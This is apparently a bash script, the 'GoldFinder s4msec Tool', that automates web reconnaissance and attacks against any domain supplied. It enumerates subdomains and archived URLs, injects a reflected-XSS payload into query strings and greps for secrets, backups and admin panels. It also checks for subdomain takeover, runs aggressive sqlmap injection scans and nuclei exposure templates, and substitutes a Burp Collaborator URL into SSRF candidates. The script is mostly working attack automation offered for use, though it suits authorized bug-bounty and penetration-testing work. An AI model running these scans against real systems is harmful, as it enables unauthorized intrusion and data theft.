#!/bin/bash

# Define color codes for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color
BOLD='\033[1m'
 
    echo -e "${BLUE}^^!!^^=======================^^===!!===^^=========================^^===!!===^^=====================^^===!!====^^===============================^^!!^^"
    echo -e "${BLUE}^^!!^^=======================^^===!!===^^=========================^^===!!===^^=====================^^===!!====^^===============================^^!!^^" 
   

    
# Display a welcome message
echo -e "${BLUE}"
figlet -f slant "GoldFinder s4msec Tool"
echo -e "${NC}"                       			   "${RED} !!!...)...!!! Hang Tight for better results. Grab a coffee – It'll Take a Bit. Thanks For Your Patience !!!...)...!!!"

# Function to display a header
header() {
    echo -e "${GREEN}========================================================================================================================="
    echo -e "${GREEN}========================================================================================================================="
    echo -e "${BOLD}$1${NC}"

}

# Function to display a footer
footer() {
    echo -e "${BLUE}========================================================================================================================="
    echo -e "${BLUE}========================================================================================================================="
    echo -e "$1"

}

    
# Function to check if required commands are available
check_commands() {
    header "Checking Required Commands"
    # Add checks for additional commands (subfinder, qsreplace, freq, tee, waybackurls, gau, sqlmap, nuclei, gauplus, figlet, httpx, )
    if ! command -v subfinder &> /dev/null || ! command -v httpx &> /dev/null || \
       ! command -v gau &> /dev/null || ! command -v figlet &> /dev/null || \
       ! command -v uro &> /dev/null || ! command -v qsreplace &> /dev/null || \
       ! command -v freq &> /dev/null || ! command -v tee &> /dev/null || \
       ! command -v waybackurls &> /dev/null || ! command -v gauplus &> /dev/null || \
       ! command -v sqlmap &> /dev/null || ! command -v nuclei &> /dev/null; then
        echo -e "${RED}Error: One or more required tools are not installed.${NC}"
        footer "Please install the missing tools"
        exit 1
    fi
    footer "All required tools are available"
}


# Function for processing a single domain
process_domain() {
    local domain=$1
    header "Processing Domain: $domain"
    
    echo -e "${RED}=======================================================================XX============================================================================================"
    
    echo -e "${BLUE}Checking For Valid Subdomain"
    echo -e "${RED}=======================================================================XX============================================================================================"
    subfinder -d "$domain" -silent| httpx -silent -mc 200  | tee validsub.txt 
    echo -e "${YELLOW}Valid subdomains saved to validsub.txt${NC}" ; wc -l validsub.txt
    echo -e "${RED}=======================================================================XX============================================================================================"
    
    echo -e "${BLUE}Collecting All Subdomain"
    echo -e "${RED}=======================================================================XX============================================================================================"
   subfinder -d "$domain" -silent | tee allsub.txt
    echo -e "${YELLOW}All subdomains saved to allsub.txt"; wc -l allsub.txt 
    echo -e "${RED}=======================================================================XX============================================================================================"
 
    echo -e "${BLUE}Finding Vulnerable Endpoints"  
    echo -e "${RED}=======================================================================XX============================================================================================"
    cat validsub.txt | gau --providers wayback,commoncrawl,otx,urlscan | httpx -silent  -mc 200 | tee validgau.txt
    echo -e "${YELLOW}Valid GAU saved to validgau.txt" ; wc -l validgau.txt  
    echo -e "${RED}=======================================================================XX============================================================================================"
   
    cat validsub.txt | waybackurls  | httpx -silent  -mc 200  | tee valid_wb.txt | wc -l 
    echo -e "${YELLOW}valid Waybackurls saved to valid_wb.txt" ; wc -l valid_wb.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    echo -e "${BLUE}Testing Reflected Xss"
     echo -e "${RED}=======================================================================XX============================================================================================"
    cat valid_wb.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee xss.txt
    echo -e "${YELLOW}XXS URL saved to xxs.txt" ; wc -l xss.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
    echo -e "${BLUE}Collecting All Javascript Files"    
     echo -e "${RED}=======================================================================XX============================================================================================"
    cat valid_wb.txt | grep "js" | tee js.txt | wc -l
    echo -e "${YELLOW}Javascript File saved to js.txt" ; wc -l js.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"  js.txt | tee grep-js | wc -l
    echo -e "${YELLOW}grep File saved to grep-js" ; wc -l grep-js
     echo -e "${RED}=======================================================================XX============================================================================================"
       
    cat valid_wb.txt | grep ".xls\|.xlsx\|.sql\|.csv\|.env\|.msql\|.bak\|.bkp\|.bkf\|.old\|.temp\|.db\|.mdb\|.config\|.yaml\|.zip\|.tar\|.git\|.xz\|.asmx\|.vcf\|.pem" | sort | uniq | tee wb_sensitive.txt | wc -l     
    echo -e "${YELLOW}WB Sensitive files saved wb_sensitive.txt" ; wc -l wb_sensitive.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
#other
    
    cat valid_wb.txt | grep -i "jira\|jenkins\|grafana\|mailman\|+CSCOE+\|+CSCOT+\|+CSCOCA+\|symfony\|graphql\|debug\|gitlab\|phpmyadmin\|phpMyAdmin" | sort | uniq | tee wb-third-party-assets.txt| wc -l 
    echo -e "${YELLOW}All wb-third-party-assets Files saved to wb-third-party-assets.txt" ; wc -l wb-third-party-assets.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | grep "@" | sort | uniq | tee wb-emails-usersnames.txt | wc -l
    echo -e "${YELLOW}All wb-emails-usersnames Files saved to wb-emails-usersnames.txt{NC}" ; wc -l wb-emails-usersnames.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | grep "error." | sort | uniq | tee wb-error.txt | wc -l
    echo -e "${YELLOW}All wb-error Files saved to wb-error.txt" ; wc -l wb-error.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | grep -i "root\| internal\| private\|secret" | sort | uniq | tee other-possible-sensitive-path.txt | wc -l
    echo -e "${YELLOW}ALL other-possible-sensitive-path Files saved to other-possible-sensitive-path.txt" ; wc -l other-possible-sensitive-path.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | grep -i "login\|singup\|admin\|dashboard\|wp-admin\|singin\|adminer\|dana-na\|login/?next/=" | sort | uniq | tee wb-panel.txt | wc -l
    echo -e "${YELLOW}All wb-panel Files saved to wb-panel.txt" ; wc -l wb-panel.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | grep -i robots.txt | sort | uniq | tee only-robots.txt | wc -l
    echo -e "${YELLOW}robots.txt Files saved to only-robots.txt" ; wc -l only-robots.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | cut -d'/' -f3 | cut -d':' -f1 | sed 's/^\(\|s\):\/\///g' | tee subdomains.txt | wc -l 
    echo -e "${YELLOW}subdomains Files saved to subdomains.txt" ; wc -l subdomains.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | rev | cut -d '/' -f 1 | rev | sed 's/^\(\|s\):\/\///g' | sed '/=\|.js\|.gif\|.html\|.rss\|.cfm\|.htm\|.jpg\|.mp4\|.css\|.jpeg\|.png\|:\|%/d' | tee wordlist.txt | wc -l
    echo -e "${YELLOW}wordlist Files saved to wordlist.txt" ; wc -l wordlist.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat validsub.txt  | gauplus -random-agent | grep  ".xlsx" | uro | tee xlsx.txt
    echo -e "${YELLOW} xlsx Files saved xlsx.txt" ; wc -l xlsx.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    cat valid_wb.txt | grep '.bak' | tee bak.txt 
    echo -e "${YELLOW} bak File saved bak.txt" ; wc -l bak.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
      
    cat valid_wb.txt | grep '.log'| tee log.txt 
    echo -e "${YELLOW} Log Files saved log.txt" ; wc -l log.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    echo -e "${BLUE}Checking Subdomain Takeover Vulnerability"
     echo -e "${RED}=======================================================================XX============================================================================================"
    python3 ~/tools/sub404/sub404.py -f allsub.txt -o sub_404.txt
    echo -e "${YELLOW}Possible subdomain_takeover Saved to sub_404.txt" ; wc -l sub_404.txt
     echo -e "${RED}=======================================================================XX============================================================================================"  
    
    echo -e "${BLUE}Checking Subdomain Takeover Vulnerability"
     echo -e "${RED}=======================================================================XX============================================================================================"
    subzy run --targets allsub.txt --hide_fails     
     echo -e "${RED}=======================================================================XX============================================================================================"      
     
    cat valid_wb.txt | gf sqli| tee sql1.txt
    echo -e "${YELLOW}All sql Saved to sql1.txt" ; wc -l sql1.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
    
    cat validsub.txt | gauplus -random-agent | grep  ".sql" | tee sql.txt | wc -l
    echo -e "${YELLOW} SQL Files Saved to sql.txt" ; wc -l sql.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
   
   
    echo -e "${BLUE}Running SQLI Scan"
     echo -e "${RED}=======================================================================XX============================================================================================"
    sqlmap -m sql1.txt --batch -b --level=3 --risk=3 --random-agent -o sql_result.txt
    echo -e "${YELLOW} sql Result saved to sql_result.txt " ; wc -l sql_result.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    
    sqlmap -m sql.txt --batch -b --level=3 --risk=3 --random-agent -o sql_result.txt
    echo -e "${YELLOW}sql Result saved to sql_result.txt" ; wc -l sql_result.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    echo -e "${BLUE}Running Nuclie Scan"
     echo -e "${RED}=======================================================================XX============================================================================================"
    nuclei -l js.txt -t /root/nuclei-templates/http/exposures -es info -o nuclei.txt
    echo -e "${YELLOW} Nuclei Result saved to nuclei.txt " ; wc -l nuclei.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    echo -e "${BLUE}Collecting SSRF Endpoints"
     echo -e "${RED}=======================================================================XX============================================================================================"
    cat valid_wb.txt | gf ssrf | tee SSRF_endpoint.txt
    echo -e "${YELLOW}SSRF Result saved to SSRF_endpoint.txt" ; wc -l SSRF_endpoint.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
    footer "Finished Processing Domain"
}

# Function for processing a list of domains from a file
process_domain_list() {
     local domain_list=$1
      header "Processing Domain List: $domain_list"
 
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     echo -e "${BLUE}Checking For Valid Subdomain"
     echo -e "${RED}=======================================================================XX============================================================================================"
     subfinder -dL "$domain_list" -silent| httpx -silent -mc 200  | tee validsub.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
     echo -e "${YELLOW}Valid subdomains saved to validsub.txt" ; wc -l validsub.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     echo -e "${BLUE}Collecting All Subdomain"    
     echo -e "${RED}=======================================================================XX============================================================================================"
     subfinder -dL "$domain_list" -silent | tee allsub.txt
     echo -e "${YELLOW}All subdomains saved to allsub.txt"; wc -l allsub.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     echo -e "${BLUE}Finding Vulnerable Endpoints"  
     echo -e "${RED}=======================================================================XX============================================================================================"
     cat validsub.txt | gau --providers wayback,commoncrawl,otx,urlscan | httpx -silent -mc 200   | tee validgau.txt
     echo -e "${YELLOW}Valid GAU URLs saved to validgau.txt" ; wc -l validgau.txt  
     echo -e "${RED}=======================================================================XX============================================================================================"
      
  
     cat validsub.txt | waybackurls | httpx -silent -mc 200  | tee valid_wb.txt | wc -l
     echo -e "${YELLOW}valid Waybackurls saved to valid_wb.txt" ; wc -l valid_wb.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     echo -e "${BLUE}Testing Reflected Xss"
     echo -e "${RED}=======================================================================XX============================================================================================"
     cat valid_wb.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee xss.txt
     echo -e "${YELLOW}XXS URL saved to xxs.txt" ; wc -l xss.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
           
     echo -e "${BLUE}Collecting All Javascript Files"    
     echo -e "${RED}=======================================================================XX============================================================================================"
     cat valid_wb.txt | grep  "js" | tee js.txt | wc -l
     echo -e "${YELLOW}All Javascript Files saved to js.txt" ; wc -l js.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
     
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" js.txt |tee grep-js | wc -l
    echo -e "${YELLOW}grep File saved to grep-js" ; wc -l grep-js
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     cat valid_wb.txt| grep ".xls\|.xlsx\|.sql\|.csv\|.env\|.msql\|.bak\|.bkp\|.bkf\|.old\|.temp\|.db\|.mdb\|.config\|.yaml\|.zip\|.tar\|.git\|.xz\|.asmx\|.vcf\|.pem" | sort | uniq | tee wb_sensitive.txt | wc -l        
     echo -e "${YELLOW}WB Sensitive files saved wb_sensitive.txt" ; wc -l wb_sensitive.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
#other
    
     cat valid_wb.txt | grep -i "jira\|jenkins\|grafana\|mailman\|+CSCOE+\|+CSCOT+\|+CSCOCA+\|symfony\|graphql\|debug\|gitlab\|phpmyadmin\|phpMyAdmin" | sort| uniq | tee wb-third-party-assets.txt| wc -l 
     echo -e "${YELLOW}All wb-third-party-assets Files saved to wb-third-party-assets.txt" ; wc -l wb-third-party-assets.txt 
      echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | grep "@" | sort | uniq | tee wb-emails-usersnames.txt | wc -l
     echo -e "${YELLOW}All wb-emails-usersnames Files saved to wb-emails-usersnames.txt" ; wc -l wb-emails-usersnames.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | grep "error." | sort | uniq | tee wb-error.txt | wc -l
     echo -e "${YELLOW}All wb-error Files saved to wb-error.txt" ; wc -l wb-error.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | grep -i "root\| internal\| private\|secret" | sort | uniq | tee other-possible-sensitive-path.txt | wc -l
     echo -e "${YELLOW}ALL other-possible-sensitive-path Files saved to other-possible-sensitive-path.txt" ; wc -l other-possible-sensitive-path.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | grep -i "login\|singup\|admin\|dashboard\|wp-admin\|singin\|adminer\|dana-na\|login/?next/=" | sort | uniq | tee wb-panel.txt | wc -l
     echo -e "${YELLOW}All wb-panel Files saved to wb-panel.txt" ; wc -l wb-panel.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | grep -i robots.txt | sort | uniq | tee only-robots.txt | wc -l
     echo -e "${YELLOW}robots.txt Files saved to only-robots.txt" ; wc -l only-robots.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | cut -d'/' -f3 | cut -d':' -f1 | sed 's/^\(\|s\):\/\///g' | tee subdomains.txt | wc -l 
     echo -e "${YELLOW}subdomains Files saved to subdomains.txt" ; wc -l subdomains.txt 
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | rev | cut -d '/' -f 1 | rev | sed 's/^\(\|s\):\/\///g' | sed '/=\|.js\|.gif\|.html\|.rss\|.cfm\|.htm\|.jpg\|.mp4\|.css\|.jpeg\|.png\|:\|%/d' | tee wordlist.txt | wc -l
     echo -e "${YELLOW}wordlist Files saved to wordlist.txt" ; wc -l wordlist.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     cat validsub.txt | gauplus  -random-agent | grep  ".xlsx" | tee xlsx.txt
     echo -e "${YELLOW}All xlsx saved xlsx.txt" ; wc -l xlsx.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     cat valid_wb.txt | grep '.bak' | tee bak.txt 
     echo -e "${YELLOW}bak File saved bak.txt" ; wc -l bak.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     cat valid_wb.txt | grep '.log' | tee log.txt 
     echo -e "${YELLOW} Log Files saved log.txt" ; wc -l log.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     echo -e "${BLUE}Checking Subdomain Takeover Vulnerability"
     echo -e "${RED}=======================================================================XX============================================================================================"
     python3 ~/tools/sub404/sub404.py -f allsub.txt -o sub_404.txt
     echo -e "${YELLOW}Possible subdomain_takeover Saved to sub_404.txt" ; wc -l sub_404.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     echo -e "${BLUE}Checking Subdomain Takeover Vulnerability"
     echo -e "${RED}=======================================================================XX============================================================================================"
     subzy run --targets allsub.txt --hide_fails     
     echo -e "${RED}=======================================================================XX============================================================================================"

     cat valid_wb.txt | gf sqli| tee sql1.txt
     echo -e "${YELLOW}All sql Saved to sql1.txt" ; wc -l sql1.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     cat validsub.txt  | gauplus  -random-agent | grep -i ".sql" | tee sql.txt | wc -l
     echo -e "${YELLOW}All sql Saved to sql.txt " ; wc -l sql.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
      
     echo -e "${BLUE}Running SQLI Scan"
     echo -e "${RED}=======================================================================XX============================================================================================"
     sqlmap -m sql1.txt --batch -b --level=3 --risk=3 --random-agent -o sql_result1.txt
     echo -e "${YELLOW}sql Result saved to sql_result1.txt" ; wc -l sql_result1.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     sqlmap -m sql.txt --batch -b --level=3 --risk=3 --random-agent -o sql_result.txt
     echo -e "${YELLOW}sql Result saved to sql_result.txt" ; wc -l sql_result.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
    
     echo -e "${BLUE}Running Nuclie Scan"
     echo -e "${RED}=======================================================================XX============================================================================================"
     nuclei -l js.txt -t /root/nuclei-templates/http/exposures -es info -o nuclei.txt
     echo -e "${YELLOW}Nuclei Result saved to nuclei.txt" ; wc -l nuclei.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     echo -e "${BLUE}Collecting SSRF Endpoints"
     echo -e "${RED}=======================================================================XX============================================================================================"
     cat valid_wb.txt | gf ssrf | tee SSRF_endpoint.txt
     echo -e "${YELLOW}SSRF Result saved to SSRF_endpoint.txt" ; wc -l SSRF_endpoint.txt
     echo -e "${RED}=======================================================================XX============================================================================================"
     
     
     footer "Finished Processing Domain"
}


# Function to check for SSRF
check_ssrf() {
    header "SSRF Check"
    echo -e "${YELLOW}SSRF Result saved to SSRF_endpoint.txt${NC}" ; wc -l SSRF_endpoint.txt
    echo -e "${YELLOW}Do you want to check for SSRF? (1=Yes, 2=No)${NC}"
    read -r choice
    if [ "$choice" -eq 1 ]; then
        echo -e "${GREEN}Running SSRF check...${NC}"
        echo -e "${YELLOW}Enter your Burp Collaborator URL:${NC}"
        read -r burp_collaborator_url
        # Perform SSRF check here
        cat SSRF_endpoint.txt | qsreplace "$burp_collaborator_url/" | tee ssrf_result.txt | wc -l
        echo -e "${GREEN}SSRF check completed. Results saved in ssrf_result.txt.${NC}"
    else
        echo -e "${RED}Skipping SSRF check.${NC}"
    fi
    footer "SSRF Check Completed"
}

# Function to check for SQL Injection
#check_sql_injection() {
#   header "SQL Injection Check"
#  echo -e "${YELLOW}Do you want to check for SQL Injection? (1=Yes, 2=No)${NC}"
#    read -r choice
#    if [ "$choice" -eq 1 ]; then
#       echo -e "${GREEN}Running SQL Injection check...${NC}"
#       sqlmap -m sql.txt --batch -b --level=3 --risk=3 --random-agent -o sql_result.txt
#    else
#       echo -e "${RED}Skipping SQL Injection check.${NC}"
#    fi
#    footer "SQL Injection Check Completed"
#}

#### Function to check for Nuclei
#check_nuclei() {
#    echo -e "${RED}Do you want to check for Nuclei? (1=Yes, 2=No)${NC}"
#    read -r choice
#    if [ "$choice" -eq 1 ]; then
#        echo -e "${RED}Running Nuclei check...\n${NC}"
#     #Ensure you adjust the path to your nuclei-templates as needed
#       nuclei -l js.txt -t /root/nuclei-templates/http/exposures -es info -o nuclei.txt
#    else
#        echo -e "${RED}Skipping Nuclei check.\n${NC}"
 #   fi
#}

# Ensure required commands are available
check_commands

# Parse command line arguments
while getopts ":d:t:" opt; do
    case $opt in
        d) process_domain "$OPTARG"
           ;;
        t) process_domain_list "$OPTARG"
           ;;
        *) usage
           ;;
    esac
done

# If no options were provided, show usage information
if [ $OPTIND -eq 1 ]; then
    usage
fi

# Check for SSRF before continuing with other processes
check_ssrf

# Check for SQL Injection before continuing with other processes
#check_sql_injection

# Check for Nuclei before continuing with other processes
#check_nuclei


# Footer message
footer "End of s4msec Tool Script"
